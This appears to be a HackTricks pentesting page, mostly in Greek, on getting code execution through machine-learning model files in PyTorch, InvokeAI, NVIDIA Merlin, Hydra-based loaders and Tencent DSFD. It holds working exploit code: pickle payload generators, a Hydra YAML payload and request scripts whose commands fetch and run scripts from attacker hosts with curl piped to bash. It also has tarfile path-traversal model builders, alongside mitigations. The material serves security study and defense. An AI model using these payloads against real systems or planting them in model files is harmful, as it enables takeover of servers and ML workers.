# Μοντέλα RCE

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων για RCE

Τα μοντέλα Machine Learning συνήθως διαμοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch κ.λπ. Αυτά τα μοντέλα μπορούν να φορτωθούν σε μηχανές προγραμματιστών ή σε συστήματα παραγωγής για χρήση. Συνήθως τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά υπάρχουν περιπτώσεις όπου το μοντέλο μπορεί να χρησιμοποιηθεί για την εκτέλεση αυθαίρετου κώδικα στο σύστημα ως επιθυμητή λειτουργία ή εξαιτίας ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Την στιγμή της συγγραφής, τα παρακάτω είναι μερικά παραδείγματα αυτού του τύπου ευπαθειών:

| **Framework / Εργαλείο**        | **Ευπάθεια (CVE αν υπάρχει)**                                                    | **Διάνυσμα RCE**                                                                                                                           | **Αναφορές**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle σε model checkpoint οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας το `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download προκαλεί εκτέλεση κώδικα; Java deserialization RCE στο management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint ενεργοποιεί pickle reducer κατά τη `load_model_trainer_states_from_checkpoint` → εκτέλεση κώδικα στον ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Η φόρτωση μοντέλου με **Lambda** layer εκτελεί αυθαίρετο Python κώδικα          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Δημιουργημένο `.tflite` μοντέλο προκαλεί integer overflow → heap corruption (πιθανή RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση μοντέλου μέσω `joblib.load` εκτελεί pickle με το payload `__reduce__` του επιτιθέμενου                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Το `numpy.load` εξ ορισμού επέτρεπε pickled object arrays – κακόβουλο `.npy/.npz` ενεργοποιεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Το external-weights path ενός ONNX μοντέλου μπορεί να διαφύγει τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Κακόβουλο ONNX model tar μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model με custom operator απαιτεί τη φόρτωση native κώδικα του επιτιθέμενου; πολύπλοκα model graphs μπορούν να κακοχρησιμοποιήσουν λογική για εκτέλεση μη-προβλεπόμενων υπολογισμών   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του model-load API με `--model-control` ενεργοποιημένο επιτρέπει relative path traversal για εγγραφή αρχείων (π.χ., overwrite `.bashrc` για RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Κατεστραμμένο GGUF model αρχείο προκαλεί heap buffer overflows στον parser, δίνοντας τη δυνατότητα για αυθαίρετη εκτέλεση κώδικα στο σύστημα του θύματος                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Κακόβουλο HDF5 (`.h5`) μοντέλο με Lambda layer εξακολουθεί να εκτελεί κώδικα κατά το load (το Keras safe_mode δεν καλύπτει την παλιά μορφή – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Πολλά ML εργαλεία (π.χ., formats με βάση pickle, Python `pickle.load`) θα εκτελέσουν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων εκτός αν μετριαστούν | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Το metadata/config του μοντέλου που ελέγχεται από τον επιτιθέμενο θέτει `_target_` σε αυθαίρετο callable (π.χ., `builtins.exec`) → εκτελείται κατά τη φόρτωση, ακόμα και με “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν κάποια python pickle-based μοντέλα όπως αυτά που χρησιμοποιεί το [PyTorch](https://github.com/pytorch/pytorch/security) τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα αν δεν φορτωθούν με `weights_only=True`. Έτσι, οποιοδήποτε pickle-based μοντέλο μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτού του είδους τις επιθέσεις, ακόμα και αν δεν αναφέρεται στον πίνακα παραπάνω.

### Hydra metadata → RCE (λειτουργεί ακόμα και με safetensors)

`hydra.utils.instantiate()` εισάγει και καλεί οποιοδήποτε dotted `_target_` σε ένα αντικείμενο configuration/metadata. Όταν βιβλιοθήκες περνούν **untrusted model metadata** στο `instantiate()`, ένας επιτιθέμενος μπορεί να προμηθεύσει ένα callable και επιχειρήματα που τρέχουν αμέσως κατά το load του μοντέλου (χωρίς να απαιτείται pickle).

Παράδειγμα payload (δουλεύει σε `.nemo`, `model_config.yaml`, repo `config.json`, ή σε `__metadata__` μέσα σε `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Ενεργοποιείται πριν την αρχικοποίηση του μοντέλου στο NeMo `restore_from/from_pretrained`, στους uni2TS HuggingFace coders, και στους FlexTok loaders.
- Η string block-list του Hydra μπορεί να παρακαμφθεί μέσω εναλλακτικών μονοπατιών import (π.χ., `enum.bltns.eval`) ή με ονόματα που επιλύονται από την εφαρμογή (π.χ., `nemo.core.classes.common.os.system` → `posix`).
- Το FlexTok επίσης αναλύει μεταδεδομένα σε μορφή string με `ast.literal_eval`, επιτρέποντας DoS (CPU/memory blowup) πριν την κλήση του Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` είναι δημοφιλές ανοιχτού κώδικα web interface για Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install` που επιτρέπει σε χρήστες να κατεβάζουν και να φορτώνουν μοντέλα από αυθαίρετα URLs.

Εσωτερικά το endpoint τελικά καλεί:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Όταν το αρχείο που παρέχεται είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από το URL που ελέγχεται από τον χρήστη, ένας επιτιθέμενος μπορεί να ενσωματώσει ένα κακόβουλο αντικείμενο με προσαρμοσμένη μέθοδο `__reduce__` μέσα στο checkpoint; η μέθοδος εκτελείται **during deserialization**, οδηγώντας σε **remote code execution (RCE)** στον InvokeAI server.

Η ευπάθεια αποδόθηκε **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Δημιουργήστε ένα κακόβουλο checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Trigger το vulnerable endpoint (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Όταν το InvokeAI κατεβάζει το αρχείο καλεί `torch.load()` → το `os.system` gadget εκτελείται και ο attacker αποκτά code execution στο πλαίσιο της διεργασίας InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί ολόκληρη τη ροή.

#### Προϋποθέσεις

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` προσβάσιμο από τον attacker  
•  Η διεργασία έχει δικαιώματα για εκτέλεση shell commands

#### Μέτρα αντιμετώπισης

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – το patch ορίζει `scan=True` από προεπιλογή και εκτελεί malware scanning πριν από τη deserialization.  
* Κατά τη φόρτωση checkpoints προγραμματιστικά, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή τον νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Επιβάλλετε allow-lists / signatures για τις πηγές μοντέλων και τρέξτε την υπηρεσία με least-privilege.

> ⚠️ Να θυμάστε ότι **οποιαδήποτε** μορφή Python βασισμένη σε pickle (συμπεριλαμβανομένων πολλών `.pt`, `.pkl`, `.ckpt`, `.pth` αρχείων) είναι εγγενώς μη ασφαλής για αποσειριοποίηση από μη αξιόπιστες πηγές.

---

Παράδειγμα ad-hoc μέτρου αντιμετώπισης αν πρέπει να διατηρήσετε παλαιότερες εκδόσεις του InvokeAI να τρέχουν πίσω από έναν reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω μη ασφαλούς `torch.load` (CVE-2025-23298)

Το Transformers4Rec της NVIDIA (μέρος του Merlin) αποκάλυψε έναν μη ασφαλή φορτωτή checkpoint που καλούσε απευθείας την `torch.load()` σε μονοπάτια παρεχόμενα από τον χρήστη. Επειδή η `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint υπό τον έλεγχο επιτιθέμενου μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά την απο-σειριοποίηση.

Ευάλωτο μονοπάτι (πριν τη διόρθωση): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στο Python `pickle`, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και επιχειρήματα. Το callable εκτελείται κατά την απο-σειριοποίηση. Εάν ένα τέτοιο αντικείμενο υπάρχει σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν οποιαδήποτε weights.

Ελάχιστο παράδειγμα κακόβουλου checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Κατευθύνσεις άμυνας ειδικές για PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Επιβάλετε την προέλευση/υπογραφές μοντέλου και την αποσειριοποίηση σε sandbox (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φόρτωση του μοντέλου:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το Tencent’s FaceDetection-DSFD εκθέτει ένα endpoint `resnet` που deserializes δεδομένα ελεγχόμενα από τον χρήστη. Το ZDI επιβεβαίωσε ότι ένας απομακρυσμένος επιτιθέμενος μπορεί να εξαναγκάσει ένα θύμα να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να προωθήσει ένα crafted serialized blob σε αυτό το endpoint, και να ενεργοποιήσει deserialization ως `root`, οδηγώντας σε πλήρη παραβίαση.

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## Μοντέλα για Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ή, με τον ακόλουθο κώδικα μπορείτε να δημιουργήσετε ένα μοντέλο που θα δημιουργεί ένα symlink προς τον κατάλογο `/tmp` όταν φορτωθεί:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Εμβάθυνση: Keras .keras deserialization and gadget hunting

Για έναν εστιασμένο οδηγό για τα .keras internals, Lambda-layer RCE, το arbitrary import issue σε ≤ 3.8 και την post-fix gadget discovery μέσα στην allowlist, δείτε:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Αναφορές

- [Ιστόλόγιο OffSec – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI commit επιδιόρθωσης 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Τεκμηρίωση module Metasploit Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – συστάσεις ασφαλείας για torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [Ιστόλόγιο ZDI – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [Ανακοίνωση ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec commit επιδιόρθωσης b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Ευάλωτος loader πριν το patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Κακόβουλο checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Loader μετά το patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
